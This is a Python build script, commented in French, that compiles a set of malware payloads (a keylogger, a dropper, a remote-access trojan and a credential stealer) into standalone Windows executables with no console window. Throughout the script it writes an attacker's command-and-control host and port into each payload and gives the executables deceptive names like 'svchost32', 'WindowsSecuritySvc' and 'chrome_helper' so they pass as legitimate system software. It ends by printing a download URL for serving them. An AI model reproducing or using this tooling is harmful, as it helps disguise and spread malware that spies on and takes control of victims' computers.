#!/usr/bin/env python3
"""
build.py — compile les payloads en .exe Windows
Usage : python build.py
"""
import os, sys, subprocess, pathlib, shutil

BUILDS_DIR = pathlib.Path("builds")
BUILDS_DIR.mkdir(exist_ok=True)

PAYLOADS = [
    {
        "script":  "payloads/keylogger_win.py",
        "outname": "WindowsSecuritySvc",   # nom du .exe
        "icon":    None,                    # mettre "icon.ico" si tu as une icône
        "noconsole": True,                  # pas de fenêtre noire
    },
    {
        "script":  "payloads/dropper.py",
        "outname": "setup_update",
        "icon":    None,
        "noconsole": True,
    },
    {
        "script":  "payloads/rat.py",
        "outname": "svchost32",
        "icon":    None,
        "noconsole": True,
    },
    {
        "script":  "payloads/stealer.py",
        "outname": "chrome_helper",
        "icon":    None,
        "noconsole": True,
    },
]

def build(payload: dict, c2_host: str, c2_port: str):
    script  = payload["script"]
    outname = payload["outname"]

    # Lire le script et injecter le C2
    code = pathlib.Path(script).read_text()
    code = code.replace("FILL_C2_HOST", c2_host)
    code = code.replace("FILL_PORT",    c2_port)
    code = code.replace("FILL_C2_URL",  f"http://{c2_host}:{c2_port}")

    # Écrire le script modifié temporairement
    tmp = pathlib.Path(f"_tmp_{outname}.py")
    tmp.write_text(code)

    # Commande PyInstaller
    cmd = [
        sys.executable, "-m", "PyInstaller",
        "--onefile",
        "--distpath", str(BUILDS_DIR),
        "--workpath", "_pyinstaller_work",
        "--specpath", "_pyinstaller_spec",
        "--name",     outname,
        "--clean",
    ]

    if payload.get("noconsole"):
        cmd.append("--noconsole")     # pas de fenêtre noire
    if payload.get("icon") and pathlib.Path(payload["icon"]).exists():
        cmd += ["--icon", payload["icon"]]

    # Ajouter les imports cachés nécessaires
    cmd += [
        "--hidden-import", "pynput",
        "--hidden-import", "pynput.keyboard",
        "--hidden-import", "pynput.keyboard._win32",
        "--hidden-import", "cryptography",
        "--hidden-import", "PIL",
        "--hidden-import", "PIL.ImageGrab",
    ]

    cmd.append(str(tmp))

    print(f"\n[*] Compilation de {outname}.exe…")
    result = subprocess.run(cmd, capture_output=True, text=True)

    # Nettoyer le tmp
    tmp.unlink(missing_ok=True)

    if result.returncode == 0:
        exe = BUILDS_DIR / (outname + ".exe")
        if exe.exists():
            size = exe.stat().st_size / 1024 / 1024
            print(f"[+] {outname}.exe compilé → {exe} ({size:.1f} MB)")
        else:
            print(f"[?] Compilation OK mais .exe introuvable")
    else:
        print(f"[!] Erreur compilation {outname}:")
        print(result.stderr[-1000:])

if __name__ == "__main__":
    import socket

    def get_ip():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except Exception:
            return "127.0.0.1"

    c2_host = input(f"IP du C2 [{get_ip()}] : ").strip() or get_ip()
    c2_port = input("Port [8080] : ").strip() or "8080"

    print(f"\n[*] Build avec C2 = {c2_host}:{c2_port}")
    print("[*] Compilation en cours…\n")

    for payload in PAYLOADS:
        build(payload, c2_host, c2_port)

    print(f"\n[+] Tous les .exe dans : {BUILDS_DIR}/")
    print("[+] Servir via : python server_v2.py")
    print(f"[+] Download URL : http://{c2_host}:{c2_port}/builds/<nom>.exe")